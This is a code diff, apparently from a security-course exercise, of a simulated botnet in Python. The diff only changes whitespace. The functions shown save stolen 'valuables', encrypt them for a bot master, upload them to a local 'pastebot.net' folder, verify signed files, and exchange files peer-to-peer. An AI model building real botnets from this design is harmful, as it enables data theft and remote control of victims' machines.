@@ -16,14 +16,17 @@ pastebot_public_key_string = open(os.path.join("pastebot.net", "public.key"), "r
 pastebot_private_key = RSA.importKey(pastebot_private_key_string)
 pastebot_public_key = RSA.importKey(pastebot_public_key_string)
 
+
 def save_valuable(data):
     valuables.append(data)
+
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
 
     data = pastebot_private_key.encrypt(data, 'x')[0]
     return data
+
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
@@ -41,12 +44,10 @@ def upload_valuables_to_pastebot(fn):
 
 
 def verify_file(f):
-
     # Verify that files first line contains "Caesar" signed with pastebot private key
 
     lines = f.split(bytes("\n", "ascii"), 1)
     first_line = int(lines[0])
-
 
     if pastebot_public_key.verify("Caesar".encode(), (first_line, 'x')):
         return True
@@ -74,12 +75,14 @@ def download_from_pastebot(fn):
     f = open(os.path.join("pastebot.net", fn), "rb").read()
     process_file(fn, f)
 
+
 def p2p_download_file(sconn):
     # Download the file from the other bot
     fn = str(sconn.recv(), "ascii")
     f = sconn.recv()
     print("Receiving %s via P2P" % fn)
     process_file(fn, f)
+
 
 ###
 
@@ -94,6 +97,7 @@ def p2p_upload_file(sconn, fn):
     print("Sending %s via P2P" % fn)
     sconn.send(fn)
     sconn.send(filestore[fn])
+
 
 def run_file(f):
     # If the file can be run,
